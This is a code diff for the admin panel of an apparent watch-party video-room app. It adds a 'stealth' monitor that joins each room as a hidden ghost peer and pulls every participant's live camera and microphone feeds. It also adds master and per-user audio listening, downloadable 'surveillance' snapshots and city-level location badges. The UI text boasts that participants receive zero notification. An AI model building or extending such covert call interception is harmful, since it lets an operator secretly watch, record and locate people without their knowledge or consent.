@@ -6,7 +6,7 @@ import {
   Square, Ban, Trash2, RefreshCw, Eye, EyeOff, Search, AlertTriangle,
   CheckCircle, Video, Flame, Clock, Key, ArrowRight, ExternalLink, LogOut,
   Copy, Radio, Sparkles, X, MapPin, Globe, Compass, Navigation, Activity, Wifi,
-  Volume2, VolumeX, Maximize2
+  Volume2, VolumeX, Maximize2, Heart, Camera, Mic, MicOff, VideoOff, ChevronDown, ChevronUp
 } from 'lucide-react';
 import { serverUrl, getSocket } from '@/lib/socket';
 import BrandLogo from '@/components/BrandLogo';
@@ -38,6 +38,10 @@ function StealthVideoTile({ stream, user, listenAudio }) {
   const videoRef = useRef(null);
   const audioRef = useRef(null);
   const [hasVideo, setHasVideo] = useState(false);
+  const [individualMute, setIndividualMute] = useState(null); // null = inherit listenAudio, boolean = manual toggle
+  const [snapshotTaken, setSnapshotTaken] = useState(false);
+
+  const effectiveAudio = individualMute !== null ? !individualMute : Boolean(listenAudio);
 
   useEffect(() => {
     if (!videoRef.current) return;
@@ -55,14 +59,45 @@ function StealthVideoTile({ stream, user, listenAudio }) {
   useEffect(() => {
     if (!audioRef.current || !stream) return;
     audioRef.current.srcObject = stream;
-    audioRef.current.muted = !listenAudio;
-    if (listenAudio) {
+    audioRef.current.muted = !effectiveAudio;
+    if (effectiveAudio) {
       audioRef.current.play().catch(() => {});
     }
-  }, [stream, listenAudio]);
+  }, [stream, effectiveAudio]);
+
+  const handleFullscreen = () => {
+    if (!videoRef.current) return;
+    try {
+      if (videoRef.current.requestFullscreen) {
+        videoRef.current.requestFullscreen();
+      } else if (videoRef.current.webkitRequestFullscreen) {
+        videoRef.current.webkitRequestFullscreen();
+      }
+    } catch {}
+  };
+
+  const handleCapture = () => {
+    if (!videoRef.current) return;
+    try {
+      setSnapshotTaken(true);
+      const canvas = document.createElement('canvas');
+      canvas.width = videoRef.current.videoWidth || 640;
+      canvas.height = videoRef.current.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+      const url = canvas.toDataURL('image/png');
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `surveillance-${(user?.name || 'caller').replace(/\s+/g, '_')}-${Date.now()}.png`;
+      a.click();
+      setTimeout(() => setSnapshotTaken(false), 800);
+    } catch {
+      setSnapshotTaken(false);
+    }
+  };
 
   return (
-    <div className="relative aspect-video rounded-xl bg-black/90 border border-purple-500/30 overflow-hidden shadow-inner group">
+    <div className="relative aspect-video rounded-xl bg-black/95 border border-purple-500/30 overflow-hidden shadow-2xl group transition-all duration-200 hover:border-pink-500/60">
       <audio ref={audioRef} autoPlay playsInline />
       <video
         ref={videoRef}
@@ -72,56 +107,102 @@ function StealthVideoTile({ stream, user, listenAudio }) {
         className={`w-full h-full object-cover ${hasVideo ? 'block' : 'hidden'}`}
       />
       {!hasVideo && (
-        <div className="absolute inset-0 flex flex-col items-center justify-center p-3 text-center bg-black/80">
-          <div className="h-9 w-9 rounded-full bg-purple-500/20 border border-purple-500/40 flex items-center justify-center text-purple-300 mb-1.5 animate-pulse">
-            <Video className="h-4 w-4" />
+        <div className="absolute inset-0 flex flex-col items-center justify-center p-3 text-center bg-gradient-to-b from-purple-950/40 to-black/90">
+          <div className="h-10 w-10 rounded-full bg-purple-500/20 border border-purple-500/40 flex items-center justify-center text-purple-300 mb-2 animate-pulse">
+            <Video className="h-5 w-5" />
           </div>
-          <span className="text-xs font-semibold text-white truncate max-w-[140px]">{user?.name || 'Participant'}</span>
-          <span className="text-[10px] text-purple-300/70">Connecting video feed…</span>
+          <span className="text-xs font-bold text-white truncate max-w-[160px]">{user?.name || 'Participant'}</span>
+          <span className="text-[10px] text-purple-300/70 mt-0.5">Connecting stealth video feed…</span>
         </div>
       )}
 
       {/* Top Overlay Badge */}
       <div className="absolute top-2 left-2 right-2 flex items-center justify-between pointer-events-none">
-        <span className="px-2 py-0.5 rounded-md bg-black/75 backdrop-blur-md text-[10px] font-bold text-white border border-white/10 flex items-center gap-1.5">
-          <span className="h-2 w-2 rounded-full" style={{ backgroundColor: user?.color || '#ec4899' }} />
-          <span>{user?.name || 'User'}</span>
-        </span>
-        {hasVideo && (
-          <span className="px-1.5 py-0.5 rounded-md bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[9px] font-semibold flex items-center gap-1">
-            <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
-            <span>LIVE</span>
-          </span>
-        )}
+        <div className="flex items-center gap-1.5 bg-black/80 backdrop-blur-md px-2 py-0.5 rounded-lg border border-white/10 max-w-[65%]">
+          <span className="h-2 w-2 rounded-full shrink-0" style={{ backgroundColor: user?.color || '#ec4899' }} />
+          <span className="text-[10px] font-bold text-white truncate">{user?.name || 'User'}</span>
+          {user?.isHost && (
+            <span className="text-[8px] bg-amber-500/30 text-amber-300 px-1 rounded font-bold uppercase shrink-0">Host</span>
+          )}
+        </div>
+
+        <div className="flex items-center gap-1">
+          {hasVideo ? (
+            <span className="px-1.5 py-0.5 rounded-md bg-emerald-500/25 text-emerald-300 border border-emerald-500/40 text-[9px] font-bold flex items-center gap-1">
+              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
+              <span>LIVE</span>
+            </span>
+          ) : (
+            <span className="px-1.5 py-0.5 rounded-md bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[9px] font-medium">
+              Awaiting Feed
+            </span>
+          )}
+        </div>
       </div>
 
-      {/* Bottom Overlay Info */}
+      {/* Bottom Overlay Controls & Info */}
       <div className="absolute bottom-2 left-2 right-2 flex items-center justify-between text-[10px] text-white/80 pointer-events-none">
-        <span className="bg-black/60 px-1.5 py-0.5 rounded backdrop-blur-sm text-[9px]">
-          ID: {(user?.id || user?.cid || '').slice(0, 8)}
-        </span>
-        <button
-          type="button"
-          onClick={() => {
-            if (videoRef.current?.requestFullscreen) videoRef.current.requestFullscreen();
-          }}
-          className="pointer-events-auto p-1 rounded bg-black/70 hover:bg-black text-white/70 hover:text-white transition cursor-pointer"
-          title="Fullscreen tile"
-        >
-          <Maximize2 className="h-3 w-3" />
-        </button>
+        <div className="flex items-center gap-1 bg-black/75 px-1.5 py-0.5 rounded backdrop-blur-sm text-[9px] font-mono text-slate-300">
+          <span>{user?.geo?.flag || '📍'}</span>
+          <span className="truncate max-w-[85px]">{user?.geo?.city || (user?.id || user?.cid || '').slice(0, 8)}</span>
+        </div>
+
+        {/* Action Controls */}
+        <div className="flex items-center gap-1 pointer-events-auto">
+          {/* Individual Audio Mute/Unmute */}
+          <button
+            type="button"
+            onClick={() => setIndividualMute(effectiveAudio)}
+            className={`p-1 rounded transition cursor-pointer ${
+              effectiveAudio
+                ? 'bg-rose-600 hover:bg-rose-500 text-white shadow-sm'
+                : 'bg-black/70 hover:bg-black text-white/70 hover:text-white'
+            }`}
+            title={effectiveAudio ? 'Mute this participant' : 'Listen to this participant'}
+          >
+            {effectiveAudio ? <Volume2 className="h-3 w-3" /> : <VolumeX className="h-3 w-3" />}
+          </button>
+
+          {/* Screenshot / Snapshot Frame */}
+          {hasVideo && (
+            <button
+              type="button"
+              onClick={handleCapture}
+              disabled={snapshotTaken}
+              className="p-1 rounded bg-black/70 hover:bg-black text-white/70 hover:text-white transition cursor-pointer"
+              title="Capture surveillance snapshot image"
+            >
+              <Camera className={`h-3 w-3 ${snapshotTaken ? 'text-pink-400 animate-spin' : ''}`} />
+            </button>
+          )}
+
+          {/* Fullscreen */}
+          <button
+            type="button"
+            onClick={handleFullscreen}
+            className="p-1 rounded bg-black/70 hover:bg-black text-white/70 hover:text-white transition cursor-pointer"
+            title="Fullscreen video feed"
+          >
+            <Maximize2 className="h-3 w-3" />
+          </button>
+        </div>
       </div>
     </div>
   );
 }
 
 // Stealth Call Monitor for Aurelia Admin Panel
-function StealthCallMonitor({ roomId, users = [] }) {
+function StealthCallMonitor({ roomId, users = [], externalListenAudio = false }) {
   const [remoteStreams, setRemoteStreams] = useState({});
-  const [listenAudio, setListenAudio] = useState(false);
+  const [listenAudio, setListenAudio] = useState(externalListenAudio);
   const [connecting, setConnecting] = useState(true);
   const peerRef = useRef(null);
   const activeCalls = useRef(new Map());
+
+  // Sync with external master audio toggle if passed
+  useEffect(() => {
+    setListenAudio(externalListenAudio);
+  }, [externalListenAudio]);
 
   // Helper to create blank video track
   const createBlankStream = () => {
@@ -146,52 +227,6 @@ function StealthCallMonitor({ roomId, users = [] }) {
     let dead = false;
     const ghostCid = 'aurelia_ghost_' + Math.random().toString(36).slice(2, 9);
     const blankStream = createBlankStream() || new MediaStream();
-
-    const initPeer = async () => {
-      try {
-        const { default: Peer } = await import('peerjs');
-        if (dead) return;
-
-        let iceServers = [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' },
-        ];
-        let peerKey = 'peerjs';
-
-        try {
-          const res = await fetch(`${serverUrl()}/api/ice`);
-          if (res.ok) {
-            const j = await res.json();
-            if (j.iceServers) iceServers = j.iceServers;
-            if (j.peerKey) peerKey = j.peerKey;
-          }
-        } catch {}
-
-        const u = new URL(serverUrl());
-        peer = new Peer(ghostCid, {
-          host: u.hostname,
-          port: +u.port || (u.protocol === 'https:' ? 443 : 80),
-          path: '/peerjs',
-          secure: u.protocol === 'https:',
-          config: { iceServers },
-          key: peerKey,
-        });
-        peerRef.current = peer;
-
-        peer.on('open', () => {
-          if (dead) return;
-          setConnecting(false);
-          callAllUsers();
-        });
-
-        peer.on('error', (err) => {
-          console.warn('Stealth monitor peer warning:', err);
-        });
-      } catch (e) {
-        console.warn('Failed to start stealth peer:', e);
-      }
-    };
 
     const callAllUsers = () => {
       if (!peerRef.current || dead) return;
@@ -227,9 +262,59 @@ function StealthCallMonitor({ roomId, users = [] }) {
       });
     };
 
+    const initPeer = async () => {
+      try {
+        const { default: Peer } = await import('peerjs');
+        if (dead) return;
+
+        let iceServers = [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' },
+        ];
+        let peerKey = 'peerjs';
+
+        try {
+          const res = await fetch(`${serverUrl()}/api/ice`);
+          if (res.ok) {
+            const j = await res.json();
+            if (j.iceServers) iceServers = j.iceServers;
+            if (j.peerKey) peerKey = j.peerKey;
+          }
+        } catch {}
+
+        let rawUrl = '';
+        try { rawUrl = serverUrl(); } catch {}
+        if (!rawUrl && typeof window !== 'undefined') rawUrl = window.location.origin;
+        const u = new URL(rawUrl || 'http://localhost:3000');
+
+        peer = new Peer(ghostCid, {
+          host: u.hostname,
+          port: +u.port || (u.protocol === 'https:' ? 443 : 80),
+          path: '/peerjs',
+          secure: u.protocol === 'https:',
+          config: { iceServers },
+          key: peerKey,
+        });
+        peerRef.current = peer;
+
+        peer.on('open', () => {
+          if (dead) return;
+          setConnecting(false);
+          callAllUsers();
+        });
+
+        peer.on('error', (err) => {
+          console.warn('Stealth monitor peer warning:', err);
+        });
+      } catch (e) {
+        console.warn('Failed to start stealth peer:', e);
+      }
+    };
+
     initPeer();
 
-    const interval = setInterval(callAllUsers, 3200);
+    const interval = setInterval(callAllUsers, 3000);
 
     return () => {
       dead = true;
@@ -243,8 +328,10 @@ function StealthCallMonitor({ roomId, users = [] }) {
     };
   }, [roomId, JSON.stringify(users.map((u) => u.id || u.cid))]);
 
+  const activeStreamCount = Object.keys(remoteStreams).length;
+
   return (
-    <div className="rounded-xl border border-purple-500/30 bg-black/60 p-4 space-y-3">
+    <div className="rounded-xl border border-purple-500/30 bg-black/70 p-4 space-y-3">
       {/* Header */}
       <div className="flex flex-wrap items-center justify-between gap-2 border-b border-white/10 pb-2.5">
         <div className="flex items-center gap-2">
@@ -252,11 +339,17 @@ function StealthCallMonitor({ roomId, users = [] }) {
             <Video className="h-4 w-4" />
           </div>
           <div>
-            <h4 className="text-xs sm:text-sm font-bold text-white flex items-center gap-2">
+            <h4 className="text-xs sm:text-sm font-bold text-white flex items-center gap-2 flex-wrap">
               <span>Stealth Video Call Monitor</span>
               <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 border border-purple-500/40 text-purple-300 font-semibold">
                 100% Hidden &bull; 0 Cam/Mic Used
               </span>
+              {activeStreamCount > 0 && (
+                <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-semibold flex items-center gap-1">
+                  <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
+                  <span>{activeStreamCount} Live Feed{activeStreamCount > 1 ? 's' : ''}</span>
+                </span>
+              )}
             </h4>
             <p className="text-[10px] text-slate-400">View real-time participant cameras silently without anyone knowing</p>
           </div>
@@ -323,7 +416,9 @@ export default function AdminPage() {
     blocked: { users: [], ips: [], rooms: [], videos: [] },
   });
 
-  const [activeTab, setActiveTab] = useState('rooms'); // 'rooms' | 'locations' | 'security' | 'broadcast'
+  const [activeTab, setActiveTab] = useState('rooms'); // 'rooms' | 'videocalls' | 'locations' | 'security' | 'broadcast'
+  const [expandedCallRooms, setExpandedCallRooms] = useState({});
+  const [globalListenAudio, setGlobalListenAudio] = useState(false);
   const [search, setSearch] = useState('');
   const [autoRefresh, setAutoRefresh] = useState(true);
   const [toast, setToast] = useState(null);
@@ -877,14 +972,21 @@ export default function AdminPage() {
             </div>
           </div>
 
-          <div className="rounded-2xl border border-white/10 bg-black/40 p-4 backdrop-blur-xl">
+          <div
+            onClick={() => setActiveTab('videocalls')}
+            className="rounded-2xl border border-pink-500/30 bg-[#1c0f1f]/50 p-4 backdrop-blur-xl cursor-pointer hover:border-pink-500/60 transition group"
+            title="Click to monitor all live video calls"
+          >
             <div className="flex items-center justify-between text-xs text-white/60">
-              <span>Connected Users</span>
-              <Users className="h-4 w-4 text-cyan-400" />
+              <span className="group-hover:text-pink-300 transition">Live Video Calls</span>
+              <Video className="h-4 w-4 text-pink-400 group-hover:scale-110 transition" />
             </div>
             <div className="mt-2 flex items-baseline gap-2">
               <span className="text-2xl font-bold text-white">{data.stats.totalConnectedUsers || 0}</span>
-              <span className="text-[11px] text-cyan-400">watching</span>
+              <span className="text-[11px] text-pink-400 flex items-center gap-1">
+                <span>live radar</span>
+                <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
+              </span>
             </div>
           </div>
 
@@ -953,6 +1055,24 @@ export default function AdminPage() {
             </button>
             <button
               type="button"
+              onClick={() => setActiveTab('videocalls')}
+              className={`flex items-center gap-2 rounded-lg px-3.5 py-2 font-medium transition cursor-pointer ${
+                activeTab === 'videocalls'
+                  ? 'bg-[#d9467a] text-white shadow-md'
+                  : 'text-white/70 hover:text-white'
+              }`}
+            >
+              <Video className="h-3.5 w-3.5 text-pink-300" />
+              <span>🎥 Live Video Calls ({allConnectedUsers.length})</span>
+              {allConnectedUsers.length > 0 && (
+                <span className="flex h-2 w-2 relative">
+                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                  <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                </span>
+              )}
+            </button>
+            <button
+              type="button"
               onClick={() => setActiveTab('locations')}
               className={`flex items-center gap-2 rounded-lg px-3.5 py-2 font-medium transition cursor-pointer ${
                 activeTab === 'locations'
@@ -989,7 +1109,7 @@ export default function AdminPage() {
             </button>
           </div>
 
-          {(activeTab === 'rooms' || activeTab === 'locations') && (
+          {(activeTab === 'rooms' || activeTab === 'locations' || activeTab === 'videocalls') && (
             <div className="relative w-full sm:w-72">
               <Search className="absolute left-3 top-2.5 h-3.5 w-3.5 text-white/40" />
               <input
@@ -999,6 +1119,8 @@ export default function AdminPage() {
                 placeholder={
                   activeTab === 'locations'
                     ? 'Search city, country, IP, user…'
+                    : activeTab === 'videocalls'
+                    ? 'Search caller, room ID, IP…'
                     : 'Search room ID, media, or user…'
                 }
                 className="w-full rounded-xl bg-white/5 border border-white/10 pl-9 pr-3 py-1.5 text-xs text-white placeholder-white/40 focus:border-[#d9467a] focus:outline-none transition"
@@ -1109,7 +1231,26 @@ export default function AdminPage() {
                           </div>
                         </div>
 
-                        <div className="flex items-center gap-1.5 shrink-0">
+                        <div className="flex items-center gap-1.5 shrink-0 flex-wrap">
+                          <button
+                            type="button"
+                            onClick={() => {
+                              setExpandedCallRooms((prev) => ({
+                                ...prev,
+                                [room.roomId]: !prev[room.roomId],
+                              }));
+                            }}
+                            className={`rounded-lg border px-2.5 py-1 text-xs font-semibold transition flex items-center gap-1.5 shadow-sm cursor-pointer ${
+                              expandedCallRooms[room.roomId]
+                                ? 'bg-pink-600/30 border-pink-500/60 text-pink-200 shadow-pink-600/20'
+                                : 'bg-white/10 hover:bg-white/15 border-white/20 text-slate-200'
+                            }`}
+                            title={expandedCallRooms[room.roomId] ? 'Close inline live video call' : 'Watch live video call inline'}
+                          >
+                            <Video className="h-3.5 w-3.5 text-pink-400" />
+                            <span>{expandedCallRooms[room.roomId] ? 'Hide Video Call' : '📹 Live Video Call'}</span>
+                          </button>
+
                           <button
                             type="button"
                             onClick={() => handleGhostJoin(room.roomId)}
@@ -1131,6 +1272,13 @@ export default function AdminPage() {
                           </button>
                         </div>
                       </div>
+
+                      {/* Inline Live Video Call Monitor */}
+                      {expandedCallRooms[room.roomId] && (
+                        <div className="animate-in fade-in duration-200">
+                          <StealthCallMonitor roomId={room.roomId} users={room.users || []} />
+                        </div>
+                      )}
 
                       {/* Video Playback Details (Security Monitor) */}
                       <div className="rounded-xl border border-white/10 bg-white/5 p-3.5 space-y-3">
@@ -1372,7 +1520,144 @@ export default function AdminPage() {
           </div>
         )}
 
-        {/* ================= TAB 2: LIVE MEMBER LOCATIONS & GEO-RADAR ================= */}
+        {/* ================= TAB: LIVE VIDEO CALLS SURVEILLANCE RADAR ================= */}
+        {activeTab === 'videocalls' && (
+          <div className="space-y-6">
+            {/* Master Surveillance Overview Banner */}
+            <div className="rounded-2xl border border-pink-500/30 bg-gradient-to-r from-purple-950/40 via-black/60 to-pink-950/40 p-5 sm:p-6 shadow-2xl backdrop-blur-2xl flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
+              <div className="space-y-1.5">
+                <div className="flex flex-wrap items-center gap-2.5">
+                  <div className="h-9 w-9 rounded-xl bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-300 shadow-md">
+                    <Video className="h-5 w-5" />
+                  </div>
+                  <h3 className="text-base sm:text-lg font-black text-white flex items-center gap-2 flex-wrap">
+                    <span>Live Video Call Surveillance Radar</span>
+                    <span className="text-[10px] px-2.5 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold uppercase tracking-wider flex items-center gap-1">
+                      <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
+                      100% Invisible Admin
+                    </span>
+                  </h3>
+                </div>
+                <p className="text-xs text-white/60 max-w-2xl">
+                  Supervise real-time WebRTC camera &amp; audio feeds across every active room simultaneously. Admin hardware cameras and microphones remain completely powered off (0 cam LED, 0 mic) and room participants receive zero notification.
+                </p>
+              </div>
+
+              {/* Master Control Action Bar */}
+              <div className="flex items-center gap-3 flex-wrap">
+                <button
+                  type="button"
+                  onClick={() => setGlobalListenAudio(!globalListenAudio)}
+                  className={`px-4 py-2 rounded-xl border text-xs font-bold flex items-center gap-2 transition cursor-pointer shadow-lg ${
+                    globalListenAudio
+                      ? 'bg-rose-600 border-rose-500 text-white shadow-rose-600/30 animate-pulse'
+                      : 'bg-white/10 border-white/20 text-slate-200 hover:bg-white/15'
+                  }`}
+                  title={globalListenAudio ? 'Mute all room calls' : 'Unmute audio across all monitored rooms'}
+                >
+                  {globalListenAudio ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
+                  <span>{globalListenAudio ? 'Master Audio: UNMUTED 🔊' : 'Master Audio: MUTED 🔇'}</span>
+                </button>
+
+                <div className="px-3.5 py-2 rounded-xl bg-black/50 border border-white/10 text-xs text-slate-300 flex items-center gap-2">
+                  <Users className="h-3.5 w-3.5 text-cyan-400" />
+                  <span>Total Callers: <strong className="text-white">{allConnectedUsers.length}</strong></span>
+                </div>
+              </div>
+            </div>
+
+            {/* Video Call Rooms Grid */}
+            {filteredRooms.length === 0 ? (
+              <div className="rounded-2xl border border-white/10 bg-black/40 p-12 text-center backdrop-blur-xl space-y-3">
+                <Video className="mx-auto h-12 w-12 text-white/20" />
+                <h3 className="text-base font-semibold text-white">No active video call rooms</h3>
+                <p className="text-xs text-white/50 max-w-sm mx-auto">
+                  {search
+                    ? 'No rooms or callers match your search query.'
+                    : 'When visitors create or join cinema couches, their live video and audio streams will appear here in real-time.'}
+                </p>
+              </div>
+            ) : (
+              <div className="grid gap-6 lg:grid-cols-2">
+                {filteredRooms.map((room) => {
+                  const roomUsers = room.users || [];
+                  const hostUser = roomUsers.find((u) => u.isHost) || roomUsers[0];
+
+                  return (
+                    <div
+                      key={room.roomId}
+                      className="rounded-2xl border border-pink-500/25 bg-[#0e0a16]/85 p-5 shadow-2xl backdrop-blur-2xl space-y-4 hover:border-pink-500/50 transition flex flex-col justify-between"
+                    >
+                      {/* Room Header inside Surveillance Grid */}
+                      <div className="flex items-start justify-between gap-3 border-b border-white/10 pb-3">
+                        <div className="space-y-1">
+                          <div className="flex items-center gap-2 flex-wrap">
+                            <span className="font-mono text-base font-black text-white tracking-wide">
+                              {room.roomId}
+                            </span>
+                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 border border-purple-500/30 text-purple-300 font-semibold">
+                              {roomUsers.length} {roomUsers.length === 1 ? 'member' : 'members'}
+                            </span>
+                            {room.media?.title && (
+                              <span
+                                className="text-[10px] px-2 py-0.5 rounded-md bg-white/5 text-slate-300 border border-white/10 truncate max-w-[200px]"
+                                title={room.media.title}
+                              >
+                                🎬 {room.media.title}
+                              </span>
+                            )}
+                          </div>
+
+                          <div className="text-[11px] text-white/50 flex items-center gap-2 flex-wrap">
+                            <span>
+                              Host: <strong className="text-white">{hostUser?.name || 'Unknown'}</strong>
+                            </span>
+                            {room.hasPass && (
+                              <span className="text-amber-300 flex items-center gap-0.5">
+                                <Lock className="h-2.5 w-2.5" /> Protected
+                              </span>
+                            )}
+                            <span>•</span>
+                            <span>Created {new Date(room.createdAt).toLocaleTimeString()}</span>
+                          </div>
+                        </div>
+
+                        <div className="flex items-center gap-1.5 shrink-0">
+                          <button
+                            type="button"
+                            onClick={() => handleGhostJoin(room.roomId)}
+                            className="rounded-lg bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/40 px-2.5 py-1 text-xs font-semibold text-purple-200 transition flex items-center gap-1 shadow-sm"
+                            title="Open full stealth ghost control modal for this room"
+                          >
+                            <span>👻 Ghost</span>
+                          </button>
+
+                          <button
+                            type="button"
+                            onClick={() => handleBlockRoom(room.roomId)}
+                            className="rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 px-2 py-1 text-xs text-rose-300 transition flex items-center gap-1"
+                            title="Terminate room"
+                          >
+                            <Ban className="h-3.5 w-3.5" />
+                          </button>
+                        </div>
+                      </div>
+
+                      {/* Embedded Live Video Call Feeds */}
+                      <StealthCallMonitor
+                        roomId={room.roomId}
+                        users={roomUsers}
+                        externalListenAudio={globalListenAudio}
+                      />
+                    </div>
+                  );
+                })}
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ================= TAB 3: LIVE MEMBER LOCATIONS & GEO-RADAR ================= */}
         {activeTab === 'locations' && (
           <div className="space-y-4">
             {/* Geo Radar Overview Banner */}
